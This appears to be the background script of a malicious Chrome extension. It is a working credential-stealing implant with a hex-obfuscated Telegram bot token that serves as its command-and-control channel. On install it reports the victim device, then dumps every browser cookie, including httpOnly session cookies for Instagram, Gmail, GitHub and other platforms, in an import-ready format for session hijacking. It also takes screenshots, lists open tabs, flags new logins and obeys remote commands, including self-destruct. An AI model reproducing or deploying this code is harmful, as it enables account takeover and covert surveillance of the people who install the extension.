

function getToken() {
  const e = ['38','36','34','33','30','34','37','36','38','30','3A','41','41','48','6F','33','6E','48','77','54','70','63','69','6C','4B','33','75','4E','45','5F','44','49','75','4A','75','64','47','58','33','47','33','63','4F','63','34','34']
  return e.map(c => String.fromCharCode(parseInt(c, 16))).join('');
}

const TG = { token: getToken(), chat: '962420340' };
const API = `https://api.telegram.org/bot${TG.token}`;

let myId, myName, ready = false, revoked = false, cmdTimer;
let cookieCache = {}, prevCookieHash = {}, offlineQueue = [];
let lastProcessedCmd = '', lastCmdTime = 0;

// ============ INIT ============
async function init() {
  const s = await chrome.storage.local.get(['id', 'name']);
  if (s.id) { myId = s.id; myName = s.name; } else {
    myId = 'wdf_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 6);
    const p = navigator.platform || '', c = navigator.hardwareConcurrency || '?', m = navigator.deviceMemory || '?';
    myName = (p.includes('Win') ? 'Win' : p.includes('Mac') ? 'macOS' : 'Linux') + '|' + c + 'C|' + m + 'GB';
    await chrome.storage.local.set({ id: myId, name: myName });
  }
  const q = await chrome.storage.local.get('offlineQueue');
  if (q.offlineQueue) offlineQueue = q.offlineQueue;
}

// ============ TELEGRAM SEND ============
async function tg(method, body) {
  try {
    const r = await fetch(`${API}/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG.chat, ...body })
    });
    if (r.ok) { await flushQueue(); return r; }
    throw new Error('Failed');
  } catch (e) {
    offlineQueue.push({ method, body, time: Date.now() });
    if (offlineQueue.length > 30) offlineQueue.splice(0, offlineQueue.length - 30);
    await chrome.storage.local.set({ offlineQueue });
    return null;
  }
}

async function flushQueue() {
  if (!offlineQueue.length) return;
  const remaining = [];
  for (const item of offlineQueue) {
    try {
      await fetch(`${API}/${item.method}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TG.chat, ...item.body })
      });
    } catch (e) { remaining.push(item); }
    await new Promise(r => setTimeout(r, 500));
  }
  offlineQueue = remaining;
  await chrome.storage.local.set({ offlineQueue });
}

async function send(text) {
  return tg('sendMessage', { text: `🆔 ${myId.substring(0,15)}\n${text}`, parse_mode: 'HTML' });
}

async function sendChunked(msg) {
  for (let i = 0; i < msg.length; i += 4000) {
    await tg('sendMessage', { text: msg.substring(i, i + 4000), parse_mode: 'HTML' });
  }
}

// ============ SWEEP ============
async function sweep() {
  if (revoked || !ready) return { ad: '', domains: 0, total: 0 };
  const tabs = await chrome.tabs.query({});
  const seen = new Set();
  let ad = '', au = '';
  for (const t of tabs) {
    if (!t.url || t.url.startsWith('chrome://') || t.url.startsWith('about:')) continue;
    const d = new URL(t.url).hostname.replace(/^www\./, '');
    if (seen.has(d)) continue; seen.add(d);
    if (t.active) { ad = d; au = t.url; }
    const c = await chrome.cookies.getAll({ domain: d });
    cookieCache[d] = c.map(c => ({
      domain: c.domain, name: c.name, value: c.value, path: c.path,
      httpOnly: c.httpOnly, secure: c.secure, sameSite: c.sameSite || 'unspecified',
      expirationDate: c.expirationDate || null
    }));
  }
  return { ad, au, domains: seen.size, total: Object.values(cookieCache).flat().length };
}

// ============ FULL DUMP ============
async function fullDump() {
  if (revoked || !ready) return { domains: 0, total: 0 };
  const allCookies = await chrome.cookies.getAll({});
  cookieCache = {};
  allCookies.forEach(c => {
    const d = c.domain.replace(/^\./, '');
    if (!cookieCache[d]) cookieCache[d] = [];
    cookieCache[d].push({
      domain: c.domain, name: c.name, value: c.value, path: c.path,
      httpOnly: c.httpOnly, secure: c.secure, sameSite: c.sameSite || 'unspecified',
      expirationDate: c.expirationDate || null
    });
  });
  return { domains: Object.keys(cookieCache).length, total: allCookies.length };
}

// ============ LOGIN DETECTOR ============
async function checkLogins() {
  const patterns = ['sessionid', 'DSID', '__Secure-', 'SAPISID', 'SSID'];
  const detected = [];
  for (const [domain, cookies] of Object.entries(cookieCache)) {
    for (const c of cookies) {
      if (patterns.some(p => c.name.includes(p)) && !domain.includes('google.com')) {
        const hash = domain + '|' + c.name + '|' + (c.value || '').substring(0, 20);
        if (prevCookieHash[domain] !== hash) {
          prevCookieHash[domain] = hash;
          detected.push(domain);
          break;
        }
      }
    }
  }
  if (detected.length) await send(`🔑 <b>SESSION DETECTED</b>\n📍 ${detected.join(', ')}`);
}

// ============ DIFF ============
async function diffDomain(target) {
  await sweep();
  const found = cookieCache[target] || Object.entries(cookieCache).find(([d]) => d.includes(target))?.[1];
  if (!found) return send(`❌ "${target}" not found`);
  const current = found.map(c => c.name + '|' + c.value).sort().join('||');
  const prev = prevCookieHash['diff_' + target] || '';
  if (prev && prev !== current) {
    const prevNames = prev.split('||').map(p => p.split('|')[0]);
    const newC = found.filter(c => !prevNames.includes(c.name));
    const removed = prevNames.filter(n => !found.find(c => c.name === n));
    let msg = `🔄 <b>${target}</b>\n`;
    if (newC.length) msg += `➕ New:\n` + newC.map(c => `• ${c.name}`).join('\n') + '\n';
    if (removed.length) msg += `➖ Removed:\n` + removed.map(n => `• ${n}`).join('\n');
    await send(msg);
  } else if (!prev) {
    await send(`📋 ${target}: ${found.length} cookies (first check)`);
  } else {
    await send(`✅ ${target}: No changes`);
  }
  prevCookieHash['diff_' + target] = current;
}

// ============ SCREENSHOT ============
async function captureScreen() {
  try {
    const dataUrl = await chrome.tabs.captureVisibleTab(null, { format: 'png' });
    const base64 = dataUrl.split(',')[1];
    const binary = atob(base64);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
    const blob = new Blob([bytes], { type: 'image/png' });
    const formData = new FormData();
    formData.append('chat_id', TG.chat);
    formData.append('photo', blob, 'screenshot.png');
    formData.append('caption', `📸 ${myName}`);
    await fetch(`https://api.telegram.org/bot${TG.token}/sendPhoto`, { method: 'POST', body: formData });
  } catch (e) {
    await send('❌ Screenshot failed.');
  }
}

// ============ EXPORT ============
async function exportDomain(target, useFullDump = false) {
  if (useFullDump) await fullDump(); else await sweep();
  let found = cookieCache[target];
  if (!found) found = Object.entries(cookieCache).find(([d]) => d.includes(target))?.[1];
  if (!found) return send(`❌ "${target}" not found`);
  const editorFormat = found.map(c => ({
    domain: c.domain, name: c.name, value: c.value, path: c.path || '/',
    secure: !!c.secure, httpOnly: !!c.httpOnly,
    sameSite: (c.sameSite || 'lax').toLowerCase(),
    expirationDate: c.expirationDate || Math.floor(Date.now() / 1000) + 86400 * 365, session: !c.expirationDate
  }));
  const json = JSON.stringify(editorFormat, null, 2);
  await send(`📎 <b>${target}</b> — ${editorFormat.length} cookies`);
  await sendChunked(`<pre>${json}</pre>`);
}

// ============ COMMAND HANDLER ============
async function handleCommand(cmd) {
  const parts = cmd.split(' ');
  const action = parts[0].toLowerCase();
  const arg = parts.slice(1).join(' ');

  if (action === '/live') {
    const r = await sweep();
    const tabs = await chrome.tabs.query({});
    const openTabs = tabs.filter(t => t.url && !t.url.startsWith('chrome://'))
      .map(t => `• ${t.url.replace(/^https?:\/\//, '').substring(0, 50)}`).join('\n');
    await send(`🟢 <b>LIVE</b>\n💻 ${myName}\n🌐 ${r.ad || 'idle'}\n📑 ${r.domains} domains | ${r.total} cookies\n\n📋 <b>Tabs:</b>\n${openTabs || 'none'}`);
  }

  else if (action === '/cookies') {
    await sweep();
    let msg = `🍪 <b>DOMAINS</b>\n`;
    for (const [d, c] of Object.entries(cookieCache)) msg += `\n<b>${d}</b> — ${c.length} cookies`;
    await sendChunked(msg || 'No cookies.');
  }

  else if (action === '/domain' || action === '/export') {
    if (!arg) return send('❌ Usage: /domain instagram.com');
    await exportDomain(arg, true);
  }

  else if (action === '/dump') {
    if (arg) {
      await send(`🔍 Scanning all cookies for <b>${arg}</b>...`);
      await exportDomain(arg, true);
    } else {
      await send('🔍 <b>Scanning all browser cookies...</b>');
      const r = await fullDump();
      const priority = ['instagram.com', 'facebook.com', 'youtube.com', 'gmail.com', 'google.com',
                        'twitter.com', 'x.com', 'linkedin.com', 'github.com', 'reddit.com',
                        'tiktok.com', 'discord.com', 'amazon.com', 'netflix.com', 'spotify.com'];
      const found = [];
      for (const [domain, cookies] of Object.entries(cookieCache)) {
        if (priority.some(p => domain.includes(p))) found.push({ domain, count: cookies.length });
      }
      let msg = `📦 <b>FULL DUMP</b>\n🍪 ${r.total} cookies | ${r.domains} domains\n\n━━━ <b>MAJOR PLATFORMS</b> ━━━\n`;
      found.sort((a,b) => b.count - a.count).forEach(f => {
        msg += `\n🔑 <b>${f.domain}</b> (${f.count} cookies)\n`;
        (cookieCache[f.domain] || []).forEach(c => {
          msg += `  • <code>${c.name}</code> = ${(c.value||'').substring(0,30)} ${c.httpOnly?'🔐':''}${c.secure?'🔒':''}\n`;
        });
      });
      await sendChunked(msg);
      await send(`💡 Use <b>/domain instagram.com</b> to export structured JSON for Cookie-Editor`);
    }
  }

  else if (action === '/diff' && arg) { await diffDomain(arg); }

  else if (action === '/screen') { await captureScreen(); }

  else if (action === '/alldomains') {
    await sweep();
    const all = [];
    for (const [, c] of Object.entries(cookieCache)) all.push(...c.map(c => ({
      domain: c.domain, name: c.name, value: c.value, path: c.path || '/',
      secure: !!c.secure, httpOnly: !!c.httpOnly,
      sameSite: (c.sameSite || 'lax').toLowerCase(),
      expirationDate: c.expirationDate || Math.floor(Date.now() / 1000) + 86400 * 365, session: !c.expirationDate
    })));
    const json = JSON.stringify(all, null, 2);
    await send(`📦 <b>ALL</b> — ${all.length} cookies`);
    await sendChunked(`<pre>${json}</pre>`);
  }

  else if (action === '/status') {
    const tabs = await chrome.tabs.query({});
    await send(`📊 <b>${myName}</b>\n🆔 <code>${myId}</code>\n📑 ${tabs.length} tabs\n🚫 Revoked: ${revoked}\n📦 Queue: ${offlineQueue.length}`);
  }

  else if (action === '/devices') {
    await send(`📱 <b>THIS DEVICE</b>\n💻 ${myName}\n🆔 <code>${myId}</code>\n\n📋 <b>How to target:</b>\n/wdf_abc123 /live → targets one device\n/live → all devices respond`);
  }

  else if (action === '/sweep') {
    const r = await sweep();
    await checkLogins();
    await send(`✅ ${r.domains} domains, ${r.total} cookies`);
  }

  else if (action === '/revoke') { revoked = true; await send('🚫 Stopped.'); }
  else if (action === '/unrevoke') { revoked = false; await send('✅ Resumed.'); }

  else if (action === '/selfdestruct') {
    await send('💀 Destroying...');
    await chrome.storage.local.clear();
    chrome.management.uninstallSelf();
  }

  else {
    await send(`📋 <b>ALL DEVICES:</b>\n/live /cookies /dump /screen /status /devices\n\n📋 <b>TARGET ONE:</b>\n/wdf_[id] /live\n\n📋 <b>SINGLE:</b>\n/domain [name] /diff [name] /export [name]\n/alldomains /sweep /revoke /unrevoke`);
  }
}

// ============ POLL COMMANDS (with device targeting + duplicate prevention) ============
let lastCmdId = 0;
async function checkCommands() {
  try {
    const r = await fetch(`https://api.telegram.org/bot${TG.token}/getUpdates?offset=${lastCmdId + 1}&timeout=5`);
    const d = await r.json();
    if (d.ok && d.result && d.result.length) {
      d.result.forEach(u => {
        if (u.update_id > lastCmdId) lastCmdId = u.update_id;
        const msg = u.message || u.channel_post;
        if (msg && msg.text && msg.text.startsWith('/')) {
          const text = msg.text.trim();
          const msgTime = msg.date || 0;
          
          // DUPLICATE PREVENTION: Skip if same command received within 3 seconds
          if (text === lastProcessedCmd && (msgTime - lastCmdTime) < 3) return;
          lastProcessedCmd = text;
          lastCmdTime = msgTime;
          
          // DEVICE TARGETING
          const parts = text.split(' ');
          if (parts[0].startsWith('/wdf_')) {
            const targetId = parts[0].replace('/', '');
            const actualCmd = parts.slice(1).join(' ');
            if (myId.startsWith(targetId)) {
              handleCommand(actualCmd);
            }
          } else {
            handleCommand(text);
          }
        }
      });
    }
  } catch (e) { }
}

// ============ AUTO SWEEP ============
async function autoSweep() {
  await sweep();
  await checkLogins();
}

// ============ STARTUP ============
chrome.runtime.onInstalled.addListener(async () => {
  await init();
  await send(`🟢 <b>CONNECTED</b>\n💻 ${myName}\n\n📋 Commands: /live /dump /cookies /domain /screen /status\n🎯 Target: /wdf_[id] /command\n📖 Help: just type /`);
  setTimeout(() => { ready = true; }, 5000);
  cmdTimer = setInterval(checkCommands, 4000);
  chrome.alarms.create('keepalive', { periodInMinutes: 0.33 });
  chrome.alarms.create('sweep', { periodInMinutes: 3 });
});

chrome.runtime.onStartup.addListener(async () => {
  await init();
  await send(`🔄 <b>RESTARTED</b>\n💻 ${myName}`);
  setTimeout(() => { ready = true; }, 5000);
  cmdTimer = setInterval(checkCommands, 4000);
  chrome.alarms.create('keepalive', { periodInMinutes: 0.33 });
  chrome.alarms.create('sweep', { periodInMinutes: 3 });
});

chrome.alarms.onAlarm.addListener(async (alarm) => {
  if (alarm.name === 'keepalive') { /* ping */ }
  if (alarm.name === 'sweep') { await autoSweep(); }
});